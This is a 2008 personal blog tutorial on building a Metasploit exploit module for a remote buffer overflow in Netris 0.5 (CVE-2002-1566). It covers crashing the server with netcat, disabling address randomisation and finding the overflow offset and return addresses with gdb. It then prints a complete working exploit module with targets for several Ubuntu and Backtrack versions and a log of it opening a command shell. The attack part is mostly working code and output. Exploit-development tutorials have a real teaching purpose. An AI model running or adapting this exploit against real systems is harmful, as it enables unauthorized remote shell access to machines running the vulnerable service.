<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="description" content="description goes here" />
    <meta name="keywords" content="keywords,goes,here" />
    <meta name="author" content="Your Name" />
    <meta name="generator" content="webgen - http://webgen.rubyforge.org" />
    <link rel="stylesheet" type="text/css" href="default.css" />
    <!--[if IE 6]>
        <link rel="stylesheet" href="browserfix.css" type="text/css" />
        <![endif]-->
    <title>developing with msf3</title>
  </head>

  <body>
    <div id="sidebar">
    <h1>dougsko dot com</h1>
      <h2>fish from sweden are red.</h2>

      <div id="menu">
        <ul><li class="webgen-menu-level1 webgen-menu-submenu"><a href="crack_wep/index.html">crack wep</a></li><li class="webgen-menu-level1 webgen-menu-submenu"><a href="rspike/index.html">rspike</a></li><li class="webgen-menu-level1"><a href="contact.html">contact</a></li><li class="webgen-menu-level1 webgen-menu-item-selected"><span>developing with msf3</span></li><li class="webgen-menu-level1"><a href="index.html">home</a></li></ul>
      </div>

      <!--
      <h3>Links:</h3>
      <ul>
        <li><a href="http://webgen.rubyforge.org">webgen homepage</a></li>
        <li><a href="http://andreasviklund.com/templates/">Website templates</a></li>
        <li><a href="http://openwebdesign.org/">Open Web Design</a></li>
        <li><a href="http://oswd.org/">OSWD.org</a></li>
      </ul>
	-->
    </div>

    <div id="content">
      <h2>developing an exploit using the metasploit framework</h2>
<p>In this tutorial, I will show you how to create an exploit module for<br />
the Metasploit Framework starting from a vulnerability report.</p>
<h3>the vulnerability</h3>
<p>The program I chose to exploit is Netris.  I chose this because it&#8217;s<br />
vulnerability is a simple buffer overflow, it is remote, and there is already a<br />
working exploit out there that we can use as a starting point.  You can<br />
reference this vulnerability here: <a href="http://www.securityfocus.com/bid/5681">CVE2002-1566</a>.<br />
Note that this vulnerability applies only to version 0.5.</p>
<h3>getting started</h3>
<p>First off, get the source for Netris 0.5.  You can get it<br />
<a href="ftp://ftp.netris.org/pub/netris/">here</a>.  Compile it, and make sure it runs OK.</p>
<p>The released exploit for this explains that our buffer should look like this:</p>
<pre>
  [68 filler bytes][nops][shellcode][return address]
</pre>
<p>However, lets begin with something a little more simple.  Let&#8217;s see what<br />
happens when we send a whole bunch of &quot;A&quot;s at the Netris server.</p>
<p>In one shell:</p>
<pre>
  $ gdb netris
</pre>
<p>Now you are in gdb and ready to run Netris.  From the gdb prompt, start the<br />
server:</p>
<pre>
  (gdb) run -w
</pre>
<p>Now, in another shell:</p>
<pre>
  $ ruby -e 'print "A"*16000'| nc localhost 9284
</pre>
<p>You may need to ctrl+c out of netcat, but when that is done, take a look at<br />
your gdb session.  It should look like this:</p>
<pre>
  Program received signal SIGSEGV, Segmentation fault.
  0x41414141 in ?? ()
</pre>
<p>This is prefect.  What this shows is that we just overwrote the instruction<br />
pointer <code>($eip)</code> to <code>0x41414141</code>, which is hex for <code>AAAA</code>.</p>
<p>Since we can control the instruction pointer, we can control the flow of this<br />
program.  From here on out, you may need to set your kernel to not use<br />
randomized virtual addressing.  You can do this with sysctrl using the<br />
following command:</p>
<pre>
  $ sudo sysctl -w kernel.randomize_va_space=0
</pre>
<p>This is so the buffer will be stored in relatively the same place each time,<br />
allowing us to return into it.</p>
<h3>on to the framework</h3>
<p>First, start out with a relatively generic exploit script.  You can just copy<br />
one of the Linux exploits under <code>modules/exploits/linux</code> to get started.</p>
<pre>

require 'msf/core'

module Msf

class Exploits::Mine::Netris &lt; Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'Netris 0.5 Buffer Overflow (Linux)',
			'Description'    =&gt; %q{
	      			Netris 0.5 exploit.  
				Discovery of this issue is credited to Artur Byszko / bajkero.	
			},
			'Version'	 =&gt; '0.1.0',
			'Author'         =&gt; ['dougsko'],
			'License'        =&gt; GPL_LICENSE,
			'References'     =&gt;
				[
					[ 'BID', '5680'], 
					[ 'CVE', '2002-1566' ],
					[ 'URL', 'http://securityvulns.com/files/netrisx.c' ],
					[ 'URL', 'http://xforce.iss.net/xforce/xfdb/10081' ],
				],
			'Privileged'     =&gt; false,
			'Payload'	 =&gt;
				{
					'Space' =&gt; 1024,

				},
			'Platform'	=&gt; ['linux'],
			'Targets'	=&gt;
				[
					[ 'Ubuntu 8.04',
						{ 'Ret'		=&gt; 0x80522b0,
						  'Arch'	=&gt; [ARCH_X86 ],
						  'BufSize'	=&gt; 9692,
						}
					],
					
				],
			'DisclosureDate' =&gt; '08/14/2003',
			'DefaultTarget'  =&gt; 0 ))

			register_options( [ Opt::RPORT(9284) ], self.class)
	end

	def exploit
	end
end	
end

</pre>
<p>Notice that I have already filled in some of the specific information about<br />
this exploit.  The next big piece of info that we need is the return address.<br />
We need an address that will point back to somewhere within our buffer.<br />
Finding this address can be a little tricky, but here&#8217;s how I did it:</p>
<ul>
	<li>1. Run Netris in gdb.</li>
	<li>2. Overflow it with a bunch of &quot;A&quot;s.</li>
	<li>3. Take a look at the netBuf function, since this is near where the<br />
overflow is happening.  (You did read the vulnerability notes right&#8230;?)</li>
</ul>
<pre>

(gdb) x/20s netBuf
0x8052260 &lt;netBuf&gt;:      'A' &lt;repeats 64 times&gt;
0x80522a1 &lt;netBufSize+1&gt;:        ""
0x80522a2 &lt;netBufSize+2&gt;:        ""
0x80522a3 &lt;netBufSize+3&gt;:        ""
0x80522a4 &lt;isServer&gt;:    'A' &lt;repeats 200 times&gt;...
0x805236c:       'A' &lt;repeats 200 times&gt;...
0x8052434 &lt;opponentHost+116&gt;:    'A' &lt;repeats 200 times&gt;...
0x80524fc &lt;scratch+28&gt;:  'A' &lt;repeats 200 times&gt;...
0x80525c4 &lt;scratch+228&gt;:         'A' &lt;repeats 200 times&gt;...
0x805268c &lt;scratch+428&gt;:         'A' &lt;repeats 200 times&gt;...
0x8052754 &lt;scratch+628&gt;:         'A' &lt;repeats 200 times&gt;...
0x805281c &lt;scratch+828&gt;:         'A' &lt;repeats 200 times&gt;...
0x80528e4 &lt;curShape&gt;:    'A' &lt;repeats 200 times&gt;...
0x80529ac:       'A' &lt;repeats 200 times&gt;...
0x8052a74:       'A' &lt;repeats 200 times&gt;...
0x8052b3c:       'A' &lt;repeats 200 times&gt;...
0x8052c04:       'A' &lt;repeats 200 times&gt;...
0x8052ccc:       'A' &lt;repeats 200 times&gt;...
0x8052d94:       'A' &lt;repeats 200 times&gt;...
0x8052e5c:       'A' &lt;repeats 200 times&gt;...

</pre>
<p>Notice that after 0&#215;80529ac, memory is basically filled with our &quot;A&quot;s.  I just<br />
picked a random address somewhere after that and used 0&#215;80522b0.  This is OK,<br />
since we&#8217;ll be using a large <span class="caps">NOP</span> sled we won&#8217;t have to be very accurate when it<br />
comes to the return address.  The next step is to find out just how long our<br />
buffer needs to be in order to overflow the buffer, but still overwrite the <span class="caps">EIP</span><br />
register properly with out return address.</p>
<p>To do this, we&#8217;ll use the scripts patter_create.rb, and pattern_offset.rb under<br />
the tools folder.  First, start up Netris in gdb again:</p>
<pre>
  $ gdb netris
  (gdb) run -w
</pre>
<p>In another shell use the pattern_create.rb script to create your overflow<br />
string:</p>
<pre>
  ./pattern_create.rb 16000| nc localhost 9284 
</pre>
<p>This will cause an overflow:</p>
<pre>
  Program received signal SIGSEGV, Segmentation fault.
  0x316c4d30 in ?? ()
</pre>
<p>Now, we see that the <span class="caps">EIP</span> has been overwritten with 0&#215;316c4d30, which is the<br />
pattern of letters that we sent to the server.  To find just how big of a<br />
buffer it took to do this, we use pattern_offset.rb:</p>
<pre>
  ./pattern_offset.rb 0x316c4d30 16000 
  9692
</pre>
<p>We see that our buffer size should be 9692 bytes long.  Put that into the<br />
target definition in our exploit module.  We are now ready to get down to<br />
business.</p>
<h3>taking over</h3>
<p>All we have to do now is define our exploit method in the module we are<br />
writing.</p>
<pre>
def exploit
                print_status("Generating buffer")
                buf = make_nops(target['BufSize'] - payload.encoded.length) + payload.encoded + [target.ret].pack('V')
                
                print_status("Sending \#{buf.size} byte buffer...")
                connect
                sock.put(buf)
                sock.get
                handler
                disconnect
        end
</pre>
<p>This sets up our attack buffer like so:</p>
<pre> [NOPs][shellcode][return address] total: 9692 bytes </pre>
<p>Then, we send it out with <code>sock.put(buf)</code>.  The framework really takes care of<br />
most of the other details involved, including shellcode generation.  Here is<br />
what my final exploit module looks like:</p>
<pre>

require 'msf/core'

module Msf

class Exploits::Mine::Netris &lt; Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'Netris 0.5 Buffer Overflow (Linux)',
			'Description'    =&gt; %q{
	      			Netris 0.5 exploit.  
				Discovery of this issue is credited to Artur Byszko / bajkero.	
			},
			'Version'	 =&gt; '0.1.0',
			'Author'         =&gt; ['dougsko'],
			'License'        =&gt; GPL_LICENSE,
			'References'     =&gt;
				[
					[ 'BID', '5680'], 
					[ 'CVE', '2002-1566' ],
					[ 'URL', 'http://securityvulns.com/files/netrisx.c' ],
					[ 'URL', 'http://xforce.iss.net/xforce/xfdb/10081' ],
				],
			'Privileged'     =&gt; false,
			'Payload'	 =&gt;
				{
					'Space' =&gt; 1024,

				},
			'Platform'	=&gt; ['linux'],
			'Targets'	=&gt;
				[
					[ 'Ubuntu 6.06', 
						{ 'Ret'		=&gt; 0x80544f0,
						  'Arch'	=&gt; [ ARCH_X86 ],      	
						  'BufSize'	=&gt; 11552,
						} 
					],
					
					[  'Ubuntu 7.04',
					  	{ 'Ret'		=&gt; 0x80544f0,
					      	  'Arch'        =&gt; [ ARCH_X86 ],
				  		  'BufSize'     =&gt; 12148,
						}
					],  

					[ 'Ubuntu 8.04',
						{ 'Ret'		=&gt; 0x80522b0,
						  'Arch'	=&gt; [ARCH_X86 ],
						  'BufSize'	=&gt; 9692,
						}
					],
					
					[  'Backtrack 2',
						{ 'Ret'         =&gt; 0x80544f0,
						  'Arch'        =&gt; [ ARCH_X86 ],
					  	  'BufSize'     =&gt; 12120,
						}	  
								  
					],

				],
			'DisclosureDate' =&gt; '08/14/2003',
			'DefaultTarget'  =&gt; 0 ))

			register_options( [ Opt::RPORT(9284) ], self.class)
	end

	def exploit
		print_status("Generating buffer")
		#buf = pattern_create(16000) # debug
		#buf = "A"*(target['BufSize'] +4)
		buf = make_nops(target['BufSize'] - payload.encoded.length) + payload.encoded + [target.ret].pack('V')

		print_status("Sending \#{buf.size} byte buffer...")
		connect
		sock.put(buf)
		sock.get
		handler
		disconnect
	end
end	
end
</pre>
<p>Make a folder called <code>mine</code> under <code>modules/exploits/</code>, and put that file in it.<br />
Here is what it looks like when you run the exploit.  Note that I am running<br />
the Netris server as user <code>doug</code>.</p>
<pre>

./msfcli mine/netris rhost=localhost target=2 payload=linux/x86/shell_bind_tcp E

[*] Started bind handler
[*] Generating buffer
[*] Sending 9696 byte buffer...
[*] Command shell session 1 opened (127.0.0.1:36044 -&gt; 127.0.0.1:4444)

id
uid=1000(doug) gid=1000(doug) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),127(mythtv),1000(doug)

</pre>
<h3>wrap it up</h3>
<p>So that&#8217;s it.  We just went from vulnerability report to a working exploit.  I<br />
seem to have the best luck using the <code>linux/x86/shell_bind_tcp</code> payload.  I<br />
hope that helps make using the <span class="caps">MSF</span> a little less daunting and shows you just<br />
how powerful it can be.  Have fun!</p>
	<p><small>
	      &copy; 2008 dougsko | generated by <a href="http://webgen.rubyforge.org">webgen</a> 
	      | view <a href='developing_with_msf3.page.txt'>source</a><br />
		Last modified: Wed Dec 24 01:59:05 -0500 2008
	</small></p>
      
      	
	  
	
      
    </div>
  </body>
</html>